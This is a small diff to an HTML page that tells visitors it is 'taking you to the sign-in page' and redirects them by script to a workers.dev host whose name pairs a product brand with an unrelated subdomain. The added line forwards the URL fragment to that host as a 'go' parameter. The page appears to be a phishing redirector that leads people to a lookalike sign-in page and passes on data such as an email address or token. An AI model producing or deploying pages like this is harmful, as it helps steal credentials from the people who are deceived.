@@ -17,6 +17,6 @@
 </head>
 <body>
 <p>Private. Taking you to the sign-in page… <a href="https://plaud.kidsplanetkullu.workers.dev/">Continue</a></p>
-<script>location.replace("https://plaud.kidsplanetkullu.workers.dev/" + location.hash);</script>
+<script>var h = location.hash.slice(1); location.replace("https://plaud.kidsplanetkullu.workers.dev/" + (h ? "?go=" + encodeURIComponent(h) : ""));</script>
 </body>
 </html>
